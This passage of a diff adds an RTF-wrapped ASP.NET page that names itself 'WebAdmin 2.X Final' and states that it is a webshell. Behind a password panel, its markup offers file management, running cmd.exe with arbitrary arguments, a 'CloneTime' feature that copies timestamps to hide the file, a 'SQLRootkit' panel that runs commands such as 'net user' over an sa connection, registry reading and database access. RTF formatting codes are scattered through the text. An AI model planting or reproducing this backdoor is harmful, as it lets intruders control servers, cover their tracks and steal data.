+            If Hide.Checked = True Then\par
+                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.Hidden)\par
+            Else\par
+                If (File.GetAttributes(path) And FileAttributes.Hidden) = FileAttributes.Hidden Then\par
+                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Hidden)\par
+                End If\par
+            End If\par
+            If sys.Checked = True Then\par
+                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.System)\par
+            Else\par
+                If (File.GetAttributes(path) And FileAttributes.System) = FileAttributes.System Then\par
+                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)\par
+                End If\par
+            End If\par
+            If Archive.Checked = True Then\par
+                File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.Archive)\par
+            Else\par
+                If (File.GetAttributes(path) And FileAttributes.Archive) = FileAttributes.Archive Then\par
+                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)\par
+                End If\par
+            End If\par
+            response.Write("<script>alert('Rename Success! Please refresh')</sc"&"ript>")\par
+            response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")\par
+        End Sub\par
+    \par
+    Sub Set_Att_Click(Src As Object, E As EventArgs)\par
+        Dim error_x as Exception\par
+        Try\par
+            Call SetAttributes( request("Src") )\par
+        Catch error_x\par
+            ShowError(error_x.Message)\par
+        End Try\par
+    End Sub\par
+    \par
+    Sub ShowCopy(path As String)\par
+        Session("FileAct") = "Copy"\par
+        Session("Source") = path\par
+        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")\par
+        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")\par
+    End Sub\par
+    \par
+    Sub ShowCut(path As String)\par
+        Session("FileAct") = "Cut"\par
+        Session("Source") = path\par
+        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")\par
+        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")\par
+    End Sub\par
+    \par
+    Sub Plaste_Click(Src As Object, E As EventArgs)\par
+        Dim error_x as Exception\par
+        Try\par
+        Dim tmp As String = Session("Source")\par
+        Dim temp As String\par
+        If right(CDir.Text, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 ) <> "\\" Then\par
+            temp = CDir.Text & "\\"\par
+        Else\par
+            temp = CDir.Text\par
+        End If\par
+        If Session("FileAct") = "Copy" Then\par
+            if right(tmp, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 )="\\" then\par
+                directory.createdirectory(temp & Path.GetFileName(mid(tmp, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 , len(tmp)-\f2\rtlch\lang1025 1\f0\ltrch\lang1033 )))\par
+                call copydir(tmp, temp & Path.GetFileName(mid(tmp, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 , len(tmp)-\f2\rtlch\lang1025 1\f0\ltrch\lang1033 )) & "\\" )\par
+            Else\par
+                file.copy(tmp, temp & Path.GetFileName(tmp))\par
+            End If\par
+            response.Write("<script>alert('Copy success!');</s"&"cript>")\par
+        ElseIf Session("FileAct") = "Cut" Then\par
+            if right(tmp, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 )="\\" then\par
+                directory.move(tmp, temp & Path.GetFileName(mid(tmp, \f2\rtlch\lang1025 1\f0\ltrch\lang1033 , len(tmp)-\f2\rtlch\lang1025 1\f0\ltrch\lang1033 )) & "\\")\par
+            Else\par
+                file.move(tmp, temp & Path.GetFileName(tmp) )\par
+            End If\par
+            response.Write("<script>alert('Cut success!');</s"&"cript>")\par
+            Call ShowFolders(CDir.Text)\par
+        Else\par
+            response.Write("<script>alert('Plaste Fail!');</s"&"cript>")\par
+        End If\par
+         Catch error_x\par
+            ShowError(error_x.Message)\par
+         End Try\par
+    End Sub\par
+    \par
+    Sub copydir(a As String , b As String)\par
+          dim xdir as directoryinfo\par
+          dim mydir as new DirectoryInfo(a)\par
+          dim xfile as fileinfo\par
+          for each xfile in mydir.getfiles()\par
+             file.copy(a & xfile.name,b & xfile.name)\par
+          next\par
+          for each xdir in mydir.getdirectories()\par
+             directory.createdirectory(b & path.getfilename(a & xdir.name))\par
+             call copydir(a & xdir.name & "\\",b & xdir.name & "\\")\par
+          next\par
+    End Sub\par
+\par
+</script>\par
+<html>\par
+<head>\par
+    <title>:: WebAdmin \f2\rtlch\lang1025 2\f0\ltrch\lang1033 .X Final ::</title> <style type="text/css">BODY \{\par
+\tab COLOR: \f2\rtlch\lang1025 #0000\f0\ltrch\lang1033 ff; FONT-FAMILY: Verdana\par
+\}\par
+TD \{\par
+\tab COLOR: \f2\rtlch\lang1025 #0000\f0\ltrch\lang1033 ff; FONT-FAMILY: Verdana\par
+\}\par
+TH \{\par
+\tab COLOR: \f2\rtlch\lang1025 #0000\f0\ltrch\lang1033 ff; FONT-FAMILY: Verdana\par
+\}\par
+BODY \{\par
+\tab FONT-SIZE: \f2\rtlch\lang1025 14\f0\ltrch\lang1033 px; BACKGROUND-COLOR: #ffffff\par
+\}\par
+A:link \{\par
+\tab COLOR: \f2\rtlch\lang1025 #0000\f0\ltrch\lang1033 ff; TEXT-DECORATION: none\par
+\}\par
+A:visited \{\par
+\tab COLOR: \f2\rtlch\lang1025 #0000\f0\ltrch\lang1033 ff; TEXT-DECORATION: none\par
+\}\par
+A:hover \{\par
+\tab COLOR: #ff\f2\rtlch\lang1025 0000\f0\ltrch\lang1033 ; TEXT-DECORATION: none\par
+\}\par
+A:active \{\par
+\tab COLOR: #ff\f2\rtlch\lang1025 0000\f0\ltrch\lang1033 ; TEXT-DECORATION: none\par
+\}\par
+.buttom \{\par
+\tab BORDER-RIGHT: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; BORDER-TOP: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; BORDER-LEFT: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; COLOR: #ffffff; BORDER-BOTTOM: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; BACKGROUND-COLOR: \f2\rtlch\lang1025 #719\f0\ltrch\lang1033 bc\f2\rtlch\lang1025 5\f0\ltrch\lang1033\par
+\}\par
+.TextBox \{\par
+\tab BORDER-RIGHT: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; BORDER-TOP: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; BORDER-LEFT: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid; BORDER-BOTTOM: \f2\rtlch\lang1025 #084\f0\ltrch\lang1033 b\f2\rtlch\lang1025 8\f0\ltrch\lang1033 e \f2\rtlch\lang1025 1\f0\ltrch\lang1033 px solid\par
+\}\par
+.style\f2\rtlch\lang1025 3 \f0\ltrch\lang1033\{\par
+\tab COLOR: #ff\f2\rtlch\lang1025 0000\f0\ltrch\lang1033\par
+\}\par
+</style>\par
+    <meta http-equiv="Content-Type" content="text/html" />\par
+</head>\par
+<body>\par
+    <form method="post" enctype="multipart/form-data" runat="server">\par
+        <asp:Label id="Label_Info" runat="server" enableviewstate="False"></asp:Label>\par
+        <br />\par
+        <br />\par
+        <asp:Panel id="ULOGIN" runat="server" Wrap="False" ToolTip="Login">\par
+            <asp:Label id="Label_Pwd" runat="server" enableviewstate="False">Password:</asp:Label>\par
+            <asp:TextBox class="TextBox" id="UPass" runat="server" Wrap="False" TextMode="Password"></asp:TextBox>\par
+            <asp:Button class="buttom" id="Button_Login" onclick="login_click" runat="server" ToolTip="Click here to login" Text="Login"></asp:Button>\par
+        </asp:Panel>\par
+        <asp:Panel id="MAIN" runat="server" Wrap="False" ToolTip="Main" Visible="False">\par
+            <asp:Label id="Label_tools" runat="server" enableviewstate="False">Function:</asp:Label>\par
+            <asp:Button class="buttom" id="Button_filemanager" onclick="ShowFileM" runat="server" Text="File" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_cmd" onclick="Button_showcmd_Click" runat="server" Text="Command" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_clonetime" onclick="Button_showclone_Click" runat="server" Text="CloneTime" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_sqlcmd" onclick="Button_showcmdshell_Click" runat="server" Text="SQLRootkit" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_sysinfo" onclick="Button_showinfo_Click" runat="server" Text=" SysInfo " Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_db" onclick="ShowData" runat="server" Text="Database" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_reg" onclick="ShowReg" runat="server" Text="Regedit" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_about" onclick="ShowAbout" runat="server" Text="About" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_exit" onclick="Logout_click" runat="server" Text="Exit" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <hr />\par
+        </asp:Panel>\par
+        <asp:Panel id="FileManager" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 %">\par
+            <asp:Label id="Label_Drives" runat="server" enableviewstate="False"></asp:Label>\par
+            <br />\par
+            <asp:Label id="Label_Dir" runat="server" enableviewstate="False">Currently Dir :</asp:Label>\par
+            <asp:TextBox class="TextBox" id="CDir" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 300\f0\ltrch\lang1033 px"></asp:TextBox>\par
+            <asp:Button class="buttom" id="Button_GoTo" onclick="GoTo_click" runat="server" ToolTip="Go to the dir" Text=" Go "></asp:Button>\par
+            <asp:Button id="PlasteButton" onclick="Plaste_Click" runat="server" Text="Plaste" CssClass="buttom"></asp:Button>\par
+            <br />\par
+            <asp:Label id="Label_oper" runat="server" enableviewstate="False">Operate:</asp:Label>\par
+            <asp:TextBox class="TextBox" id="TextBox_FDName" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px"></asp:TextBox>\par
+            <asp:Button class="buttom" id="Button_NewF" onclick="NewFile" runat="server" Text="NewFile"></asp:Button>\par
+            <asp:Button class="buttom" id="Button_NewD" onclick="NewFolder" runat="server" Text="NewDir"></asp:Button>\par
+            <input class="TextBox" id="UpFile" type="file" name="upfile" runat="server" />\par
+            <asp:Button class="buttom" id="Button_UpFile" onclick="UpLoad" runat="server" Text="UpLoad" EnableViewState="False"></asp:Button>\par
+            <HT>\par
+                <br />\par
+                <asp:Label id="Label_files" runat="server" enableviewstate="False" font-size="XX-Small" width="\f2\rtlch\lang1025 800\f0\ltrch\lang1033 px"></asp:Label>\par
+                </asp:Panel>\par
+        <asp:Panel id="CMD" runat="server" Wrap="False" ToolTip="CMD" Visible="False" Width="\f2\rtlch\lang1025 380\f0\ltrch\lang1033 px">\par
+            <asp:Label id="Label_cmdpath" runat="server" enableviewstate="False" width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px">Program\par
+            : </asp:Label>\par
+            <asp:TextBox class="TextBox" id="CMDPath" runat="server" Wrap="False" Text="cmd.exe" Width="\f2\rtlch\lang1025 250\f0\ltrch\lang1033 px">c:\\windows\\system\f2\rtlch\lang1025 32\f0\ltrch\lang1033\\cmd.exe</asp:TextBox>\par
+            <br />\par
+            <asp:Label id="Label_cmd" runat="server" enableviewstate="False" width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px">Arguments\par
+            :</asp:Label>\par
+            <asp:TextBox class="TextBox" id="CMDCommand" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 250\f0\ltrch\lang1033 px">/c ver</asp:TextBox>\par
+            <asp:Button class="buttom" id="Button_cmdRun" onclick="RunCMD" runat="server" Text="Run" EnableViewState="False"></asp:Button>\par
+            <br />\par
+            <asp:Label id="cmdResult" runat="server"></asp:Label>\par
+        </asp:Panel>\par
+        <asp:Panel id="CloneTime" runat="server" Wrap="False" ToolTip="Clone Time" Visible="False">\par
+            <asp:Label id="Label_rework" runat="server">Rework File or Dir:</asp:Label>\par
+            <asp:TextBox class="TextBox" id="time\f2\rtlch\lang1025 1\f0\ltrch\lang1033 " runat="server" Wrap="False" Width="\f2\rtlch\lang1025 400\f0\ltrch\lang1033 px">c:\\webadmin\f2\rtlch\lang1025 2\f0\ltrch\lang1033 XF.aspx</asp:TextBox>\par
+            <br />\par
+            <asp:Label id="Label_copied" runat="server">Copied File or Dir : </asp:Label>\par
+            <asp:TextBox class="TextBox" id="time\f2\rtlch\lang1025 2\f0\ltrch\lang1033 " runat="server" Wrap="False" Width="\f2\rtlch\lang1025 400\f0\ltrch\lang1033 px">c:\\index.aspx</asp:TextBox>\par
+            <br />\par
+            <asp:Button class="buttom" id="Button_clone" onclick="GoCloneTime" runat="server" Text="Clone"></asp:Button>\par
+            <br />\par
+            <asp:Label id="Label_cloneResult" runat="server"></asp:Label>\par
+        </asp:Panel>\par
+        <asp:Panel id="SQLRootkit" runat="server" Wrap="False" ToolTip="SQLRootKit" Visible="False">\par
+            <asp:Label id="Label_conn" runat="server" width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px">ConnString:</asp:Label>\par
+            <asp:TextBox class="TextBox" id="ConStr" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 500\f0\ltrch\lang1033 px">server=\f2\rtlch\lang1025 127.0.0.1\f0\ltrch\lang1033 ;UID=sa;PWD=;Provider=SQLOLEDB</asp:TextBox>\par
+            <br />\par
+            <asp:Label id="Label_sqlcmd" runat="server" width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px">Command:</asp:Label>\par
+            <asp:TextBox class="TextBox" id="SQLCmd" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 500\f0\ltrch\lang1033 px">net user</asp:TextBox>\par
+            <asp:Button class="buttom" id="SQLCmdRun" onclick="CMDSHELL" runat="server" Text="Run"></asp:Button>\par
+            <br />\par
+            <asp:Label id="resultSQL" runat="server"></asp:Label>\par
+        </asp:Panel>\par
+        <asp:Panel id="SysInfo" runat="server" Wrap="False" ToolTip="System Infomation" Visible="False" EnableViewState="False">\par
+            <table width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 %" align="center" border="\f2\rtlch\lang1025 1\f0\ltrch\lang1033 ">\par
+                <tbody>\par
+                    <tr>\par
+                        <td colspan="\f2\rtlch\lang1025 2\f0\ltrch\lang1033 ">\par
+                            Web Server Information</td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td width="\f2\rtlch\lang1025 40\f0\ltrch\lang1033 %">\par
+                            Server IP</td>\par
+                        <td width="\f2\rtlch\lang1025 60\f0\ltrch\lang1033 %">\par
+                            <asp:Label id="ServerIP" runat="server" enableviewstate="False"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td height="\f2\rtlch\lang1025 73\f0\ltrch\lang1033 ">\par
+                            Machine Name</td>\par
+                        <td>\par
+                            <asp:Label id="MachineName" runat="server" enableviewstate="False"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            Network Name</td>\par
+                        <td>\par
+                            <asp:Label id="UserDomainName" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            User Name in this Process</td>\par
+                        <td>\par
+                            <asp:Label id="UserName" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            OS Version</td>\par
+                        <td>\par
+                            <asp:Label id="OS" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            Started Time</td>\par
+                        <td>\par
+                            <asp:Label id="StartTime" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            System Time</td>\par
+                        <td>\par
+                            <asp:Label id="NowTime" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            IIS Version</td>\par
+                        <td>\par
+                            <asp:Label id="IISV" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            HTTPS</td>\par
+                        <td>\par
+                            <asp:Label id="HTTPS" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            PATH_INFO</td>\par
+                        <td>\par
+                            <asp:Label id="PATHS" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            PATH_TRANSLATED</td>\par
+                        <td>\par
+                            <asp:Label id="PATHS\f2\rtlch\lang1025 2\f0\ltrch\lang1033 " runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            SERVER_PORT</td>\par
+                        <td>\par
+                            <asp:Label id="PORT" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                    <tr>\par
+                        <td>\par
+                            SeesionID</td>\par
+                        <td>\par
+                            <asp:Label id="SID" runat="server"></asp:Label></td>\par
+                    </tr>\par
+                </tbody>\par
+            </table>\par
+        </asp:Panel>\par
+        <asp:Panel id="DATA" runat="server" Wrap="False" ToolTip="Manage Database" Visible="False">\par
+            <asp:Label id="label_datacs" runat="server" width="\f2\rtlch\lang1025 120\f0\ltrch\lang1033 px">ConnString :</asp:Label>\par
+            <asp:TextBox class="TextBox" id="DataCStr" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 500\f0\ltrch\lang1033 px">Provider=Microsoft.Jet.OLEDB.\f2\rtlch\lang1025 4.0\f0\ltrch\lang1033 ;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb</asp:TextBox>\par
+            <br />\par
+            <asp:Label id="Label_datatype" runat="server" width="\f2\rtlch\lang1025 120\f0\ltrch\lang1033 px">Database Type:</asp:Label>\par
+            <asp:RadioButton id="Type_SQL" runat="server" Text="MSSQL" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px" CssClass="buttom" OnCheckedChanged="DB_onrB_\f2\rtlch\lang1025 1\f0\ltrch\lang1033 " GroupName="DBType" AutoPostBack="True"></asp:RadioButton>\par
+            <asp:RadioButton id="Type_Acc" runat="server" Text="Access" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px" CssClass="buttom" OnCheckedChanged="DB_onrB_\f2\rtlch\lang1025 2\f0\ltrch\lang1033 " GroupName="DBType" AutoPostBack="True" Checked="True"></asp:RadioButton>\par
+            <asp:Button class="buttom" id="DB_Submit" onclick="DB_Submit_Click" runat="server" Text="Submit" Width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px"></asp:Button>\par
+            <br />\par
+            <asp:Label id="db_showTable" runat="server"></asp:Label>\par
+            <br />\par
+            <asp:Label id="DB_exe" runat="server" height="\f2\rtlch\lang1025 37\f0\ltrch\lang1033 px" visible="False">Execute SQL :</asp:Label>\par
+            <asp:TextBox id="DB_EString" runat="server" TextMode="MultiLine" Visible="false" Width="\f2\rtlch\lang1025 500\f0\ltrch\lang1033 " CssClass="TextBox" Height="\f2\rtlch\lang1025 50\f0\ltrch\lang1033 px"></asp:TextBox>\par
+            <asp:Button id="DB_eButton" onclick="DB_Exec_Click" runat="server" Text="Exec" Visible="false" CssClass="buttom"></asp:Button>\par
+            <br />\par
+            <asp:Label id="DB_ExecRes" runat="server"></asp:Label>\par
+            <br />\par
+            <asp:DataGrid id="DB_DataGrid" runat="server" Width="\f2\rtlch\lang1025 800\f0\ltrch\lang1033 px" with="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 %" AllowPaging="true" AllowSorting="true" OnSortCommand="DB_Sort" PageSize="\f2\rtlch\lang1025 20\f0\ltrch\lang1033 " OnPageIndexChanged="DB_Page" PagerStyle-Mode="NumericPages">\par
+                <PagerStyle mode="NumericPages"></PagerStyle>\par
+            </asp:DataGrid>\par
+        </asp:Panel>\par
+        <asp:Panel id="reg" runat="server" Wrap="False" ToolTip="Read Regedit" Visible="False">\par
+            <asp:Label id="label_rkey" runat="server" width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px">Key :</asp:Label>\par
+            <asp:TextBox class="TextBox" id="RegKey" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 500\f0\ltrch\lang1033 px">HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName</asp:TextBox>\par
+            <br />\par
+            <asp:Label id="label_rV" runat="server" width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px">Value:</asp:Label>\par
+            <asp:TextBox class="TextBox" id="RegValue" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 200\f0\ltrch\lang1033 px">ComputerName</asp:TextBox>\par
+            <asp:Button class="buttom" id="ReadReg_Click" onclick="ReadReg" runat="server" Text="Read"></asp:Button>\par
+            <br />\par
+            <br />\par
+            <asp:Label id="RegResult" runat="server"></asp:Label>\par
+        </asp:Panel>\par
+        <asp:Panel id="about" runat="server" Wrap="False" ToolTip="about WebAdmin \f2\rtlch\lang1025 2\f0\ltrch\lang1033 .X Final" Visible="False" Width="\f2\rtlch\lang1025 789\f0\ltrch\lang1033 px" Height="\f2\rtlch\lang1025 25\f0\ltrch\lang1033 px" HorizontalAlign="Center">\par
+            <br />\par
+            <br />\par
+            <asp:Label id="label_about" runat="server" width="\f2\rtlch\lang1025 80\f0\ltrch\lang1033 px">WebAdmin \f2\rtlch\lang1025 2\f0\ltrch\lang1033 .X Final is a webshell\par
+            run in ASP.Net code by&nbsp;</asp:Label>\par
+            <asp:HyperLink id="HyperLink\f2\rtlch\lang1025 1\f0\ltrch\lang1033 " runat="server" Visible="True" Target="_blank" NavigateUrl="http://canglangjidi.qyun.net">hackwolf</asp:HyperLink>\par
+            <br />\par
+            <asp:Image id="Image\f2\rtlch\lang1025 1\f0\ltrch\lang1033 " runat="server" ToolTip="Build\f2\rtlch\lang1025 20051225\f0\ltrch\lang1033 " Visible="True" ImageUrl="http://j.thec.cn/canglangjidi/cljd.jpg" AlternateText="Enjoy Hacking !"></asp:Image>\par
+        </asp:Panel>\par
+        <asp:Panel id="File_Edit" runat="server" Wrap="False" ToolTip="Edit File" Visible="False" Width="\f2\rtlch\lang1025 789\f0\ltrch\lang1033 px" Height="\f2\rtlch\lang1025 25\f0\ltrch\lang1033 px" HorizontalAlign="Center">\par
+            <asp:Label id="label_path" runat="server">File Path : </asp:Label>\par
+            <asp:TextBox id="edited_path" runat="server" Width="\f2\rtlch\lang1025 300\f0\ltrch\lang1033 " CssClass="TextBox"></asp:TextBox>\par
+            * \par
+            <br />\par
+            <asp:TextBox id="edited_content" runat="server" TextMode="MultiLine" CssClass="TextBox" Columns="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 " Rows="\f2\rtlch\lang1025 25\f0\ltrch\lang1033 "></asp:TextBox>\par
+            <br />\par
+            <asp:Button id="edited_Edit" onclick="FileEdit" runat="server" Text="Sumbit" CssClass="buttom"></asp:Button>\par
+        </asp:Panel>\par
+        <asp:Panel id="File_del" runat="server" Wrap="False" ToolTip="Delete File" Visible="False" Width="\f2\rtlch\lang1025 789\f0\ltrch\lang1033 px" Height="\f2\rtlch\lang1025 25\f0\ltrch\lang1033 px" HorizontalAlign="Center">\par
+            <asp:Label id="label_del" runat="server"></asp:Label>\par
+            <br />\par
+            <asp:Button id="del_del" onclick="FileDel" runat="server" Text="Delete It" CssClass="buttom"></asp:Button>\par
+        </asp:Panel>\par
+        <asp:Panel id="File_Rename" runat="server" Wrap="False" ToolTip="Delete File" Visible="False" Width="\f2\rtlch\lang1025 789\f0\ltrch\lang1033 px" Height="\f2\rtlch\lang1025 25\f0\ltrch\lang1033 px" HorizontalAlign="Center">\par
+            <asp:TextBox class="TextBox" id="btn_rename" runat="server" Wrap="False" Width="\f2\rtlch\lang1025 200\f0\ltrch\lang1033 px"></asp:TextBox>\par
+            <asp:Button id="rn_rn" onclick="rn_rn_Click" runat="server" Text="Rename It" CssClass="buttom"></asp:Button>\par
+        </asp:Panel>\par
+        <asp:Panel id="File_Att" runat="server" Wrap="False" Visible="False" Width="\f2\rtlch\lang1025 789\f0\ltrch\lang1033 px" Height="\f2\rtlch\lang1025 25\f0\ltrch\lang1033 px" HorizontalAlign="Center">\par
+            <asp:CheckBox class="TextBox" id="onlyread" Wrap="false" Text="ReadOnly" Width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px" Runat="server"></asp:CheckBox>\par
+            <asp:CheckBox class="TextBox" id="hide" Wrap="false" Text="hide" Width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px" Runat="server"></asp:CheckBox>\par
+            <asp:CheckBox class="TextBox" id="sys" Wrap="false" Text="sys" Width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px" Runat="server"></asp:CheckBox>\par
+            <asp:CheckBox class="TextBox" id="archive" Wrap="false" Text="archive" Width="\f2\rtlch\lang1025 100\f0\ltrch\lang1033 px" Runat="server"></asp:CheckBox>\par
+            <br />\par
+            <asp:Button id="Set_Att" onclick="Set_Att_Click" runat="server" Text="Set It" CssClass="buttom"></asp:Button>\par
+        </asp:Panel>\par
+        </form>\par
+        </body>\par
+        </html>\lang9\par
+}
+ 
